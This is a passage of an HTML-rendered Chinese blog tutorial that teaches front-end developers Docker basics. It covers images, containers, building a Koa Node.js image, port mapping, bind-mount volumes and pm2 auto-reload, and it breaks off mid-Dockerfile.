data-srcset="https://cdn.nlark.com/yuque/0/2021/png/268444/1611823727345-1ed652b8-9643-46a5-a02b-ac70e301aa95.png#height=1440&id=rmeNO&originHeight=1440&originWidth=2500&originalType=binary&ratio=1&rotation=0&showTitle=false&size=207491&status=done&style=none&title=&width=2500" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>执行之后发现多了一个运行中的容器，端口号是 80，此时打开浏览器输入 127.0.0.1:80，<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/268444/1611823867302-195a61a6-43f8-4ea4-9ca9-f78860cbddcf.png#height=1440&id=fe69G&originHeight=1440&originWidth=2500&originalType=binary&ratio=1&rotation=0&showTitle=false&size=141948&status=done&style=none&title=&width=2500" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/268444/1611823867302-195a61a6-43f8-4ea4-9ca9-f78860cbddcf.png#height=1440&id=fe69G&originHeight=1440&originWidth=2500&originalType=binary&ratio=1&rotation=0&showTitle=false&size=141948&status=done&style=none&title=&width=2500" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>打开了一个 docker 的帮助文档，此时已经成功通过 docker 启动了第一个服务<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/268444/1611823943031-acabd6aa-586f-4186-86be-1bc67ef94a86.png#height=625&id=kwNov&originHeight=625&originWidth=1567&originalType=binary&ratio=1&rotation=0&showTitle=false&size=109676&status=done&style=none&title=&width=1567" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/268444/1611823943031-acabd6aa-586f-4186-86be-1bc67ef94a86.png#height=625&id=kwNov&originHeight=625&originWidth=1567&originalType=binary&ratio=1&rotation=0&showTitle=false&size=109676&status=done&style=none&title=&width=1567" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"><br><a name="YhK8S"></a></p><h1 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h1><p>学习 docker 一定要搞明白 “容器” 和 “镜像” 的概念，这个也是前端工程师很少接触的东西</p><p><a name="K9AWz"></a></p><h2 id="Docker-架构图"><a href="#Docker-架构图" class="headerlink" title="Docker 架构图"></a>Docker 架构图</h2><p>docker 架构简介： <a href="https://docs.docker.com/get-started/overview/">https://docs.docker.com/get-started/overview/</a><br /><img src="https://cdn.nlark.com/yuque/0/2021/png/268444/1612336216279-218b1f0d-9b7a-4c4c-9bc5-36db402a4cae.png#height=527&id=McWuD&originHeight=527&originWidth=1009&originalType=binary&ratio=1&rotation=0&showTitle=false&size=74779&status=done&style=none&title=&width=1009" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/268444/1612336216279-218b1f0d-9b7a-4c4c-9bc5-36db402a4cae.png#height=527&id=McWuD&originHeight=527&originWidth=1009&originalType=binary&ratio=1&rotation=0&showTitle=false&size=74779&status=done&style=none&title=&width=1009" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p><a name="vjPeq"></a></p><h2 id="镜像（image）"><a href="#镜像（image）" class="headerlink" title="镜像（image）"></a>镜像（image）</h2><p>这个便于理解的话，可以想象成有点类似于提供所需运行环境的一个模板，给后续容器运行时使用，镜像本身是无状态的，或者说预期是无状态的（只读），镜像内容会保持在 build 时的状态</p><p>官方话说是：Docker images 由多个只读层组成，这些层是堆叠的，每个层都是上一层的变化的增量</p><p><a name="roFbS"></a></p><h2 id="容器（container）"><a href="#容器（container）" class="headerlink" title="容器（container）"></a>容器（container）</h2><p>依托于镜像提供的配置信息所创建的运行环境，各个容器之间相互独立，白话一点可以理解为启动了一台服务器</p><p>官方话来说是： Docker 将一个读写文件系统分配给容器，作为其最后一层。这允许运行中的容器在其本地文件系统中创建或修改文件和目录</p><p><a name="ZfbF3"></a></p><h2 id="镜像-x2F-容器-x2F-仓库三者关系"><a href="#镜像-x2F-容器-x2F-仓库三者关系" class="headerlink" title="镜像&#x2F;容器&#x2F;仓库三者关系"></a>镜像&#x2F;容器&#x2F;仓库三者关系</h2><p><img src="https://cdn.nlark.com/yuque/0/2021/png/268444/1611826081072-7e6a7d24-f50e-45bc-be07-fed98783bcf8.png#height=316&id=APg2V&originHeight=316&originWidth=835&originalType=binary&ratio=1&rotation=0&showTitle=false&size=36744&status=done&style=none&title=&width=835" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/268444/1611826081072-7e6a7d24-f50e-45bc-be07-fed98783bcf8.png#height=316&id=APg2V&originHeight=316&originWidth=835&originalType=binary&ratio=1&rotation=0&showTitle=false&size=36744&status=done&style=none&title=&width=835" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>大概的一个流程，获取镜像源，启动镜像生成容器，运行容器并绑定宿主机端口号，通过宿主机端口号即可访 docker 的服务，如”启动第一个容器”里所输入的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 80:80 docker/getting-started</span><br></pre></td></tr></table></figure><p>-p 80:80，即将 docekr 的 80 端口绑到宿主机上</p><p><a name="syNdT"></a></p><h1 id="拥有一个自己的镜像"><a href="#拥有一个自己的镜像" class="headerlink" title="拥有一个自己的镜像"></a>拥有一个自己的镜像</h1><p>了解镜像&#x2F;容器&#x2F;仓库的概念之后，会发现如果想要通过 docker 启动一个自己的应用，首先需要构建自己的镜像，<br />这时候可以通过 Dockerfile 实现</p><p><a href="#NZKgw">关于 DockerFile 说明</a></p><p><a name="ShOzT"></a></p><h2 id="创建一个-hello-world"><a href="#创建一个-hello-world" class="headerlink" title="创建一个 hello world"></a>创建一个 hello world</h2><p>新建一个文件夹，创建一个 start.sh 脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> helloWorld &amp;&amp; <span class="built_in">cd</span> helloWorld</span><br><span class="line"></span><br><span class="line">vim start.sh</span><br><span class="line"><span class="comment"># start.sh 文件内容</span></span><br><span class="line"><span class="built_in">echo</span> hello world</span><br><span class="line"></span><br><span class="line">vim Dockerfile</span><br></pre></td></tr></table></figure><p>Dockerfile 文件内容</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 基础镜像linux alpine版</span></span><br><span class="line"><span class="keyword">FROM</span> alpine</span><br><span class="line"><span class="comment"># 添加当前文件夹为根目录到容器的app文件夹</span></span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> . /app/</span></span><br><span class="line"><span class="comment"># 设置根目录为/app</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /app</span></span><br><span class="line"><span class="comment"># 启动命令sh ./start.sh</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [ <span class="string">&quot;sh&quot;</span>, <span class="string">&quot;./start.sh&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>通过命令<code>docker build -t xuan/test .</code>生成镜像， 此时通过<code>docker image ls</code>即可查看镜像是生成</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 依次为镜像名，标签名，镜像id，创建时间， 镜像大小</span></span><br><span class="line">REPOSITORY               TAG                 IMAGE ID       CREATED         SIZE</span><br><span class="line">xuan/test                latest              af126024fa51   8 minutes ago   5.61MB</span><br></pre></td></tr></table></figure><p>后续删除镜像等操作比较依赖 image id，可以用该命令查询，在 dashboard 界面上也有相应显示<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/268444/1611828329496-0fde1146-2880-49b1-b3fc-7ccba9f999f2.png#height=236&id=m0G5n&originHeight=236&originWidth=2428&originalType=binary&ratio=1&rotation=0&showTitle=false&size=44207&status=done&style=none&title=&width=2428" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/268444/1611828329496-0fde1146-2880-49b1-b3fc-7ccba9f999f2.png#height=236&id=m0G5n&originHeight=236&originWidth=2428&originalType=binary&ratio=1&rotation=0&showTitle=false&size=44207&status=done&style=none&title=&width=2428" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p><a name="W2uhc"></a></p><h2 id="执行镜像"><a href="#执行镜像" class="headerlink" title="执行镜像"></a>执行镜像</h2><p><img src="https://cdn.nlark.com/yuque/0/2021/png/268444/1611828384192-0f92ed7f-e99e-49fd-8ea7-58c2877f7f4a.png#height=34&id=pWahi&originHeight=34&originWidth=236&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2958&status=done&style=none&title=&width=236" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/268444/1611828384192-0f92ed7f-e99e-49fd-8ea7-58c2877f7f4a.png#height=34&id=pWahi&originHeight=34&originWidth=236&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2958&status=done&style=none&title=&width=236" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"><br />通过 docker run xuan&#x2F;test，即可运行镜像，可以看到 echo 出了 hello wold，说明镜像已经生成成功且可以运行</p><p><a name="cpLYq"></a></p><h2 id="容器自动停止？-why"><a href="#容器自动停止？-why" class="headerlink" title="容器自动停止？ why"></a>容器自动停止？ why</h2><p>但是这时候发现了一个问题，当使用<code>docker ps -l</code>查看容器状态时，发现已经自动停止服务了，这个是怎么回事呢？</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 命令</span></span><br><span class="line">docker ps -l</span><br><span class="line"><span class="comment"># 状态</span></span><br><span class="line">CONTAINER ID   IMAGE       COMMAND           CREATED         STATUS                     PORTS     NAMES</span><br><span class="line">81b880ce6b37   xuan/test   <span class="string">&quot;sh ./start.sh&quot;</span>   2 minutes ago   Exited (0) 2 minutes ago             gracious_dewdney</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/268444/1611828602122-2bb12d6a-71cd-4739-a986-c9861903debd.png#height=128&id=cYI4R&originHeight=128&originWidth=826&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13334&status=done&style=none&title=&width=826" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/268444/1611828602122-2bb12d6a-71cd-4739-a986-c9861903debd.png#height=128&id=cYI4R&originHeight=128&originWidth=826&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13334&status=done&style=none&title=&width=826" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"><br />docker run 本身是执行一个进程，CMD 命令为 echo， echo 执行结束后进程自然而然终止，如果想让 docker 一直保持运行状态，必须在前台挂起一个程序<br />（这个知识点后续会用到）</p><p><a name="71gGd"></a></p><h1 id="练习：封装一个-node-服务镜像"><a href="#练习：封装一个-node-服务镜像" class="headerlink" title="练习：封装一个 node 服务镜像"></a>练习：封装一个 node 服务镜像</h1><p>通过上例，已经认识到如何构建一个镜像，但是例子比较简单无法应用于实战中，接下来封装一个 nodejs 服务器，<br />这里用到的框架是 koa</p><p><a name="P6aRL"></a></p><h2 id="创建-koa-服务"><a href="#创建-koa-服务" class="headerlink" title="创建 koa 服务"></a>创建 koa 服务</h2><p>创建一个文件夹，并新建 package.json</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建文件夹</span></span><br><span class="line"><span class="built_in">mkdir</span> koa2Docker &amp;&amp; <span class="built_in">cd</span> koa2Docker</span><br><span class="line"><span class="comment"># 初始化package.json</span></span><br><span class="line">npm init -y</span><br><span class="line"><span class="comment"># 安装koa</span></span><br><span class="line">npm install koa --save</span><br><span class="line"><span class="comment"># 创建app.js文件</span></span><br><span class="line">vim app.js</span><br></pre></td></tr></table></figure><p>app.js 内容如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> koa = <span class="built_in">require</span>(<span class="string">&quot;koa&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title function_">koa</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">ctx, next</span>) =&gt;</span> &#123;</span><br><span class="line">  ctx.<span class="property">body</span> = <span class="string">&quot;hello world xuan&quot;</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3001</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;已启动3001&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>koa 的最小服务已经搭建完成，启动看一下是否有问题</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动服务</span></span><br><span class="line">node app.js</span><br></pre></td></tr></table></figure><p>浏览器打开地址 localhost:3001，发现正常显示，说明服务正常，接下来看下怎么把这个服务封装成一个镜像<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/268444/1611892740700-2fe7fd1a-071c-4254-b56b-e84323495d22.png#height=81&id=fUsqz&originHeight=81&originWidth=363&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7090&status=done&style=none&title=&width=363" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/268444/1611892740700-2fe7fd1a-071c-4254-b56b-e84323495d22.png#height=81&id=fUsqz&originHeight=81&originWidth=363&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7090&status=done&style=none&title=&width=363" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"><br><a name="KLd4K"></a></p><h2 id="生成镜像"><a href="#生成镜像" class="headerlink" title="生成镜像"></a>生成镜像</h2><p>首先创建一个 dockerfile</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 基础镜像</span></span><br><span class="line"><span class="keyword">FROM</span> node:<span class="number">15.6</span>.<span class="number">0</span>-alpine3.<span class="number">10</span></span><br><span class="line"><span class="comment"># 添加当前文件到容器中的app</span></span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> . /app/</span></span><br><span class="line"><span class="comment"># 设置工作目录为/app</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /app</span></span><br><span class="line"><span class="comment"># 安装包</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> npm i</span></span><br><span class="line"><span class="comment"># 开放当前3001接口</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">3001</span></span><br><span class="line"><span class="comment"># 默认启动命令</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;node&quot;</span>, <span class="string">&quot;app.js&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>创建完成后 build 一下 <code>docker build -t xuan/hello .</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ...以上胜率</span></span><br><span class="line">Step 5/6 : EXPOSE 3001</span><br><span class="line"> ---&gt; Running <span class="keyword">in</span> 86dd3555883f</span><br><span class="line">Removing intermediate container 86dd3555883f</span><br><span class="line"> ---&gt; a9455b8dbf12</span><br><span class="line">Step 6/6 : CMD [<span class="string">&quot;node&quot;</span>, <span class="string">&quot;app.js&quot;</span>]</span><br><span class="line"> ---&gt; Running <span class="keyword">in</span> 41fd4f405d70</span><br><span class="line">Removing intermediate container 41fd4f405d70</span><br><span class="line"> ---&gt; c4f8645cf369</span><br><span class="line">Successfully built c4f8645cf369</span><br><span class="line">Successfully tagged xuan/hello:latest</span><br></pre></td></tr></table></figure><p>此时镜像已经打包成功，可以通过<code>docker images</code>查看，或者通过 desktop 查看<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/268444/1611893168646-92de999a-1a9d-4afc-b32c-81cdc27fc611.png#height=578&id=pqEYJ&originHeight=578&originWidth=2078&originalType=binary&ratio=1&rotation=0&showTitle=false&size=75987&status=done&style=none&title=&width=2078" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/268444/1611893168646-92de999a-1a9d-4afc-b32c-81cdc27fc611.png#height=578&id=pqEYJ&originHeight=578&originWidth=2078&originalType=binary&ratio=1&rotation=0&showTitle=false&size=75987&status=done&style=none&title=&width=2078" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p><a name="QTZB0"></a></p><h2 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h2><p>镜像生成成功后，来测试下是否生成成功，输入<code>docker run xuan/hello</code> ，此时控制台显示</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  koa2Docker docker run xuan/hello</span><br><span class="line">已启动3001</span><br></pre></td></tr></table></figure><p>使用浏览器打开 localhost:3001</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/268444/1611893655163-d2a0d54f-7490-4ed3-8f08-1844171ff76f.png#height=244&id=Rgp7v&originHeight=343&originWidth=726&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22912&status=done&style=none&title=&width=516" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/268444/1611893655163-d2a0d54f-7490-4ed3-8f08-1844171ff76f.png#height=244&id=Rgp7v&originHeight=343&originWidth=726&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22912&status=done&style=none&title=&width=516" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>并没有预期打开成功，而是显示无法访问，使用<code>docker ps -a</code>命令查看容器状况，发现容器本身是正常的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  hello docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE        COMMAND                  CREATED          STATUS          PORTS      NAMES</span><br><span class="line">66eb8ba8d1d1   xuan/hello   <span class="string">&quot;docker-entrypoint.s…&quot;</span>   14 seconds ago   Up 13 seconds   3001/tcp   vibrant_moser</span><br></pre></td></tr></table></figure><p>这是什么原因呢？<br />其实容器和本地机绑定需要依赖接口绑定才能进行访问的，<br />目前只开放了容器的 3001 接口，但是本地机是无法直接访问的，此时可以通过-p 参数来指定端口映射，修改一下启动命令为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 3001:3001 xuan/hello</span><br></pre></td></tr></table></figure><p>重新打开浏览器， 可以正常访问服务<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/268444/1611895240458-f1465438-9f11-4961-9d17-c8f7ff565a1a.png#height=87&id=nppou&originHeight=87&originWidth=320&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5385&status=done&style=none&title=&width=320" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/268444/1611895240458-f1465438-9f11-4961-9d17-c8f7ff565a1a.png#height=87&id=nppou&originHeight=87&originWidth=320&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5385&status=done&style=none&title=&width=320" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"><br />（注： 如果需要后台运行的话，可以加个 <code>-d</code> 命令）</p><p><a name="BqtYo"></a></p><h1 id="进阶：持久化存储"><a href="#进阶：持久化存储" class="headerlink" title="进阶：持久化存储"></a>进阶：持久化存储</h1><p><a name="EDi4k"></a></p><h2 id="为什么？"><a href="#为什么？" class="headerlink" title="为什么？"></a>为什么？</h2><p>因为 docker 的镜像本身是无状态的不会记录后续再容器中的任何操作，例如在 xuan&#x2F;hello 容器中修改中间件返回值，改为”edit”</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">ctx, next</span>) =&gt;</span> &#123;</span><br><span class="line">  ctx.<span class="property">body</span> = <span class="string">&quot;edit&quot;</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>重新进行 docker run，新的容器没有任何变化，也就是无法保留任何不存在 build 镜像后的任何数据，这里就遇到了一个问题？ <br />使用 mysql 容器的的话，怎么保存 docker 环境下的 mysql 数据表更新，毕竟 reload 容器会丢失全部 data，这明显不是一个可以接受的事情</p><p>这里就引出 docker 的 volume 功能</p><p><a name="XtRcc"></a></p><h2 id="Volume-的类型"><a href="#Volume-的类型" class="headerlink" title="Volume 的类型"></a>Volume 的类型</h2><p>volume 分为 2 种模式，Named Volumes， Bind Mounts，下面是区别：</p><table><thead><tr><th></th><th>Named Volumes</th><th>Bind Mounts</th></tr></thead><tbody><tr><td>Host Location</td><td>Docker chooses</td><td>You control</td></tr><tr><td>Mount Example (using <code>-v</code><br />)</td><td>my-volume:&#x2F;usr&#x2F;local&#x2F;data</td><td>&#x2F;path&#x2F;to&#x2F;data:&#x2F;usr&#x2F;local&#x2F;data</td></tr><tr><td>Populates new volume with container contents</td><td>Yes</td><td>No</td></tr><tr><td>Supports Volume Drivers</td><td>Yes</td><td>No</td></tr></tbody></table><p><a name="BdOtr"></a></p><h3 id="Named-Volumes"><a href="#Named-Volumes" class="headerlink" title="Named Volumes"></a>Named Volumes</h3><p>Named Volumes 是 docker 自己管理的 volume，通过 docker volumes create 创建</p><p><a name="BECrS"></a></p><h3 id="Bind-Mounts"><a href="#Bind-Mounts" class="headerlink" title="Bind Mounts"></a>Bind Mounts</h3><p>将宿主机与容器进行文件绑定映射，即不论在宿主机还是容器内进行文件修改，都会同步生效</p><p><a name="dat6w"></a></p><h2 id="怎么用？"><a href="#怎么用？" class="headerlink" title="怎么用？"></a>怎么用？</h2><p>这里分两种场景，一个是开发应用的时候需要宿主机和容器内的及时同步，另一个是 mysql 的数据同步，这里为了方便讲解我用的是 bind mounts 方式</p><p><a name="CTbvb"></a></p><h3 id="app-应用的更新"><a href="#app-应用的更新" class="headerlink" title="app 应用的更新"></a>app 应用的更新</h3><p>在上文更新中间件的情况下，发现如果在本地代码中进行修改，不会对容器有任何的影响，那么当有测试和开发的任务时，想要更新容器就只能够重复 打包镜像 -&gt; 运行容器这个动作，对开发有着比较大的阻碍</p><p>那么怎么利用 volume 进行本地代码和 docker 容器的联动呢？</p><p><a name="PHKg0"></a></p><h4 id="文件映射"><a href="#文件映射" class="headerlink" title="文件映射"></a>文件映射</h4><p>上面讲解过 bind mounts 是将本地文件和 docker 文件进行绑定，那么就来试一下，重新运行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 3001:3001 -v /Users/xuan/Desktop/hello/koa2Docker:/app xuan/hello</span><br></pre></td></tr></table></figure><p>修改中间件 ctx.body &#x3D; ‘edit’</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> koa = <span class="built_in">require</span>(<span class="string">&quot;koa&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title function_">koa</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">ctx, next</span>) =&gt;</span> &#123;</span><br><span class="line">  ctx.<span class="property">body</span> = <span class="string">&quot;edit&quot;</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3001</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;.........3001&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>进入容器看下具体情况<code>docker exec -it dafe1b24c301 /bin/sh</code>，这里<code>dafe1b24c301</code>为容器 id，可以通过<code>docker ps -l </code>查看，进入容器后默认在<code>/app</code>文件夹下，查看 app.js 检查下状况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 打开app.js</span></span><br><span class="line">vi app.js</span><br></pre></td></tr></table></figure><p>app.js 可以看到 app.js 内部器是修改成功的<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/268444/1611921182584-39987aa5-c107-4960-a9f3-442517ecfcfe.png#height=145&id=TXRDw&originHeight=145&originWidth=238&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7795&status=done&style=none&title=&width=238" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/268444/1611921182584-39987aa5-c107-4960-a9f3-442517ecfcfe.png#height=145&id=TXRDw&originHeight=145&originWidth=238&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7795&status=done&style=none&title=&width=238" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"><br><a name="qLkwD"></a></p><h4 id="服务更新"><a href="#服务更新" class="headerlink" title="服务更新"></a>服务更新</h4><p>刷新浏览器，发现没什么变化，这个其实是因为虽然修改了文件，但实际上服务没有重启，实际上平时写 nodejs 也是每次更新要手动重启下服务<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/268444/1611920582354-97be5080-544c-4e87-a558-23b971408769.png#height=87&id=eJsyh&originHeight=87&originWidth=320&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5385&status=done&style=none&title=&width=320" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/268444/1611920582354-97be5080-544c-4e87-a558-23b971408769.png#height=87&id=eJsyh&originHeight=87&originWidth=320&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5385&status=done&style=none&title=&width=320" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"><br />重启下容器 <code>docker restart dafe1b24c301</code>，刷新浏览器<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/268444/1611921434993-6e194ee1-454e-4391-a60d-54fef6ad8320.png#height=76&id=sVD7y&originHeight=76&originWidth=276&originalType=binary&ratio=1&rotation=0&showTitle=false&size=4265&status=done&style=none&title=&width=276" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/268444/1611921434993-6e194ee1-454e-4391-a60d-54fef6ad8320.png#height=76&id=sVD7y&originHeight=76&originWidth=276&originalType=binary&ratio=1&rotation=0&showTitle=false&size=4265&status=done&style=none&title=&width=276" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"><br />页面更新成功</p><p><a name="5Inzg"></a></p><h4 id="pm2-自动刷新"><a href="#pm2-自动刷新" class="headerlink" title="pm2 自动刷新"></a>pm2 自动刷新</h4><p>平时在开发的时候为了避免每次修改都要进行服务器重启操作，通常会使用 pm2 帮监听文件变化，一旦文件内容变动自动重启服务，帮助节约时间，这里同理</p><p>在 dockerfile 里添加 pm2 的全局安装，修改 cmd 命令，通过<code>pm2-runtime app.js --watch</code>进行启动</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> node:<span class="number">15.6</span>.<span class="number">0</span>-alpine3.<span class="number">10</span></span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> . 